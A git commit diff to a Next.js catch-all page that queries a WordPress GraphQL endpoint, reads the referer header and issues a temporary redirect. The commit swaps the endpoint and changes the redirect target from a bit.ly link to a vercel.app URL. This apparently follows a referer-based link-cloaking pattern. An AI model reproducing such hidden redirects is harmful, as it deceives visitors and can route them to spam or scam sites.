8440d037c88e98facfb0d84d58dce5809bdc2c18
yourkalon000 <165013795+yourkalon000@users.noreply.github.com>
2024-08-09 22:19:19 +0600

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = "https://dev-educationtyp1.pantheonsite.io/graphql"
+	const endpoint = "https://wordpress-1312494-4789251.cloudwaysapps.com/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://bit.ly/49T1kvE` 
+					`https://wrye-rust.vercel.app/110-2` 
 				}`,
 			},
 		};
